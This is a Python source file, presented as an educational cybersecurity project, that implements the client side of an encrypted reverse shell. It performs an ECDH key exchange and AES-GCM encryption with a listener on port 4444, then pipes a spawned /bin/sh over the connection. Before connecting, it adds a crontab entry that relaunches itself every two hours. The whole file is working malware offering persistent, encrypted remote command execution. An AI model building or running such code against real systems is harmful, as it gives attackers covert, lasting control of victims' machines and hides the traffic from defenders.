###########################################################################################
#### author: NC
#### date: 08/12/2025
####
#### DISCLAIMER:#
#### This file is part of a cybersecurity project.
#### It is intended for educational and research purposes only.
#### Must be executed in a controlled environment (e.g., sandbox or VM).
#### Any misuse of this code is strictly prohibited. The author declines any responsibility.
############################################################################################

import socket
import threading
import subprocess
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
import sys


derivated_key = None
server = "127.0.0.1"
server_port = 4444


def aes_gcm_encrypt(plaintext: bytes) -> bytes:
    nonce = os.urandom(12)
    aesgcm = AESGCM(derivated_key)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext


def aes_gcm_decrypt(ciphertext_with_nonce: bytes) -> bytes:
    if len(ciphertext_with_nonce) < 28:
        raise ValueError("Message too short")
    nonce = ciphertext_with_nonce[:12]
    ct_tag = ciphertext_with_nonce[12:]
    aesgcm = AESGCM(derivated_key)
    return aesgcm.decrypt(nonce, ct_tag, None)


def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed")
        data += chunk
    return data


def sender(connect, p, stop_event):
    while not stop_event.is_set():
        try:
            data = os.read(p.stdout.fileno(), 4096)
            if not data:
                break
            encrypted = aes_gcm_encrypt(data)
            connect.send(len(encrypted).to_bytes(4, "big"))
            connect.send(encrypted)
        except Exception as e:
            print(f"[sender] Error: {e}")
            break
    stop_event.set()


def receiver(connect, p, stop_event):
    while not stop_event.is_set():
        try:
            len_bytes = recv_exact(connect, 4)
            msg_len = int.from_bytes(len_bytes, "big")
            ciphertext = recv_exact(connect, msg_len)
            plaintext = aes_gcm_decrypt(ciphertext)
            p.stdin.write(plaintext)
            p.stdin.flush()
        except Exception as e:
            print(f"[receiver] Error: {e}")
            break
    stop_event.set()


def install_cronjob():
    """[*] Install a cronjob that relaunches the shell every 2 hours."""
    try:
        client_path = os.path.abspath(sys.argv[0])
        python_path = sys.executable
        cron_entry = f"0 */2 * * * {python_path} {client_path}\n"

        # Read existing crontab
        result = subprocess.run(
            ["crontab", "-l"],
            capture_output=True,
            text=True
        )

        existing_crontab = result.stdout if result.returncode == 0 else ""

        # Check if cronjob already installed
        if client_path in existing_crontab:
            print("[+] Cronjob already installed")
            return

        # Write new crontab
        new_crontab = existing_crontab + cron_entry
        process = subprocess.run(
            ["crontab", "-"],
            input=new_crontab,
            text=True,
            capture_output=True
        )

        if process.returncode == 0:
            print(f"[+] Cronjob installed: {cron_entry.strip()}")
        else:
            print(f"[!] Cronjob installation failed: {process.stderr}")

    except Exception as e:
        print(f"[!] Cronjob error: {e}")


def client_CONNECTING():
    global derivated_key

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as connect:
        connect.connect((server, server_port))
        connect.sendall(b"Connection")

        data = connect.recv(1024)
        print(f"Connected to {server}")

        if b"-----BEGIN PUBLIC KEY-----" not in data:
            print("[!] Handshake failed, no public key received")
            return

        ephemeral_nonce = data[:12]
        pem_data = data[12:]

        print(f"[*] Nonce received: {ephemeral_nonce.hex()}")
        peer_public_key = serialization.load_pem_public_key(pem_data)

        private_key = ec.generate_private_key(ec.SECP384R1())
        public_key = private_key.public_key()
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        connect.sendall(pem)
        print("[*] Client public key sent")

        shared_key = private_key.exchange(ec.ECDH(), peer_public_key)
        derivated_key = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b'handshake data',
        ).derive(shared_key)

        print("[*] ECDH completed - derived key ready")

        confirmation = aes_gcm_encrypt(b"ready")
        connect.send(len(confirmation).to_bytes(4, "big"))
        connect.send(confirmation)
        print("[*] Confirmation message sent")

        p = subprocess.Popen(
            ["stdbuf", "-o0", "-e0", "/bin/sh"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
        )
        print("[+] Shell started")

        stop_event = threading.Event()

        t_sender   = threading.Thread(target=sender,   args=(connect, p, stop_event))
        t_receiver = threading.Thread(target=receiver, args=(connect, p, stop_event))
        t_sender.start()
        t_receiver.start()

        stop_event.wait()
        p.terminate()
        print("[!] Session terminated")


if __name__ == "__main__":
    install_cronjob()
    client_CONNECTING()